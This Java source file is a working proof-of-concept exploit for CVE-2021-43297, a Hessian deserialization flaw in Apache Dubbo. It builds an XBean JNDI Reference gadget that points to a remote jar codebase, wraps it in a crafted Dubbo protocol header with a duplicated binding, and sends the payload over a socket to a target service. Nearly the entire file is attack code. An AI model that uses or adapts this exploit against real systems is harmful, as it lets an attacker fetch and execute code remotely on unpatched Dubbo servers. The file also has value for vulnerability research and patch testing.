package org.example;

import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import org.apache.dubbo.common.io.Bytes;
import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;
import org.example.utils.Reflections;

import javax.naming.Context;
import javax.naming.Reference;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;

/**
 * CVE-2021-43297
 * Ref: https://github.com/bitterzzZZ/CVE-2021-43297-POC?tab=readme-ov-file
 */
public class CVE_2021_43297 {
    public static void main(String[] args) throws Exception {
        hessian2();
    }

    public static void hessian2() throws Exception {
        // XBean
        Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
        Reference ref = new Reference("com.ppp.Exec", "com.ppp.Exec", "http://127.0.0.1:1234/Exec-1.0.jar");
        ContextUtil.ReadOnlyBinding gadget = new ContextUtil.ReadOnlyBinding("foo", ref, ctx);

        Reflections.setFieldValue(gadget, "fullName", "<<<<<");

        // rome
//        Object gadget = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/ruzcoc");


        //############################################################################################
        // 写入binding
        ByteArrayOutputStream binding2bytes = new ByteArrayOutputStream();
        Hessian2Output outBinding = new Hessian2Output(binding2bytes);
        outBinding.writeObject(gadget);
        outBinding.flushBuffer();
        //############################################################################################
        // binding序列化后的byte数组
        byte[] bindingBytes = binding2bytes.toByteArray();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 0x20 | 2);
        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        // 在header中记录 序列化对象 的长度，因为最后一个F被覆盖了，所以要-1
        Bytes.int2bytes(bindingBytes.length * 2 - 1, header, 12);

        // 收集header+binding
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(bindingBytes);
        byte[] bytes = byteArrayOutputStream.toByteArray();

        //############################################################################################
        // 组装payload = header+binding+binding
        byte[] payload = new byte[bytes.length + bindingBytes.length - 1];
        for (int i = 0; i < bytes.length; i++) {
            payload[i] = bytes[i];
        }

        for (int i = 0; i < bindingBytes.length; i++) {
            payload[i + bytes.length - 1] = bindingBytes[i];
        }
        //############################################################################################

        // 修改flag的值 Hessian
        payload[2] = 0x02;

        // 输出字节流的十六进制
        for (int i = 0; i < payload.length; i++) {
            System.out.print(String.format("%02X", payload[i]) + " ");
            if ((i + 1) % 8 == 0)
                System.out.print(" ");
            if ((i + 1) % 16 == 0)
                System.out.println();
        }
        System.out.println();
        // 输出byte数组转String
        System.out.println(new String(payload, 0, payload.length));

        Socket socket = new Socket("127.0.0.1", 12345);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(payload);
        outputStream.flush();
        outputStream.close();
        System.out.println("\nsend!!");
    }

}
